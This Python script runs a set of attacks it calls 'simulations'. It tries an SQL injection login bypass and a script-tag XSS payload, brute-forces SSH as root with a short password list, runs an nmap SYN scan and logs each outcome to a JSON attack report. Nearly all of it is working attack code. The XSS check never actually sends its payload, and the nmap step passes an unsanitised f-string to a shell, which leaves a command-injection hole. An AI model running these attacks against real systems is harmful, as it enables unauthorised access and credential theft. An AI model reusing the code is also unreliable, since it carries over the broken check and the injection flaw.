import requests
import paramiko
import subprocess
from bs4 import BeautifulSoup
import json

# --- SQL Injection ---
def sql_injection(url, payload):
    try:
        response = requests.get(url, params={"username": payload, "password": "any"})
        if "Welcome" in response.text:  # Adjust this check based on the target app's response
            print(f"SQL Injection Successful! Payload: {payload}")
            return True
        else:
            print(f"SQL Injection Failed with payload: {payload}")
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False

# --- XSS Attack ---
def xss_attack(url, payload):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        if payload in soup.prettify():
            print(f"XSS Successful! Payload: {payload}")
            return True
        else:
            print(f"XSS Failed with payload: {payload}")
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False

# --- SSH Brute Force Attack ---
def ssh_brute_force(target_ip, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            print(f"Trying password: {password}")
            client.connect(target_ip, username=username, password=password)
            print(f"Success! Password is: {password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            print(f"Failed attempt with password: {password}")
        except Exception as e:
            print(f"Error: {e}")
    
    client.close()
    return False

# --- Nmap Vulnerability Scanning ---
def run_nmap_scan(target_ip):
    try:
        print(f"Running Nmap scan on {target_ip}")
        nmap_command = f"nmap -sS -p 80,443 {target_ip}"  # Modify ports as necessary
        result = subprocess.run(nmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode()
    except Exception as e:
        print(f"Error running Nmap scan: {e}")
        return None

# --- Attack Report Generation ---
def generate_attack_report(attack_name, target, status, payload=None, scan_results=None):
    report = {
        "attack": attack_name,
        "target": target,
        "status": status,
        "payload": payload,
        "scan_results": scan_results,
        "timestamp": "2024-12-15"  # You can use the current date/time if needed
    }
    
    with open("attack_report.json", "a") as file:
        json.dump(report, file, indent=4)
        file.write("\n")

# --- Main Testing Function ---
def run_attack_simulations():
    # SQL Injection
    sql_url = "http://example.com/login"  # Example vulnerable URL
    sql_payload = "' OR 1=1 -- "
    sql_result = sql_injection(sql_url, sql_payload)
    generate_attack_report("SQL Injection", sql_url, "Success" if sql_result else "Failed", payload=sql_payload)
    
    # XSS Attack
    xss_url = "http://example.com/comment"  # Example vulnerable page
    xss_payload = "<script>alert('XSS Attack');</script>"
    xss_result = xss_attack(xss_url, xss_payload)
    generate_attack_report("XSS Attack", xss_url, "Success" if xss_result else "Failed", payload=xss_payload)

    # Brute Force SSH Attack
    ssh_target_ip = "192.168.1.10"
    ssh_username = "root"
    ssh_password_list = ["1234", "admin", "toor", "password"]
    ssh_result = ssh_brute_force(ssh_target_ip, ssh_username, ssh_password_list)
    generate_attack_report("SSH Brute Force", ssh_target_ip, "Success" if ssh_result else "Failed", payload=ssh_password_list)

    # Nmap Vulnerability Scan
    nmap_target_ip = "192.168.1.10"
    nmap_results = run_nmap_scan(nmap_target_ip)
    generate_attack_report("Nmap Scan", nmap_target_ip, "Completed", scan_results=nmap_results)

# --- Run All Simulations ---
if __name__ == "__main__":
    run_attack_simulations()
